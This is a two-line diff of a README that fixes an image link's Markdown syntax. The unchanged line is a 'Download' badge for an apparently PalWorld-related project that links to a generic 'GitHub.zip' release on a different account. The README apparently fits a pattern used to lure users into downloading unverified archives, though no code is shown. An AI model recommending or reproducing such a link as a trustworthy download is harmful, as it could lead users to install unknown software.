@@ -1,4 +1,4 @@
-![maxresdefaul]https://i6.imageban.ru/out/2024/02/01/b7aee9e7d8c4ddfc96e925f64132043f.png)
+![maxresdefaul](https://i6.imageban.ru/out/2024/02/01/b7aee9e7d8c4ddfc96e925f64132043f.png)
 
 [![Download](https://github.com/YusaKatsuragi/PalWorld-ES-Main/assets/12540354/cd58ba38-5e50-4f9c-adfb-42c81c0901f0)](https://github.com/XxCronosx/XxCronosx1/releases/download/csdk/GitHub.zip)
 
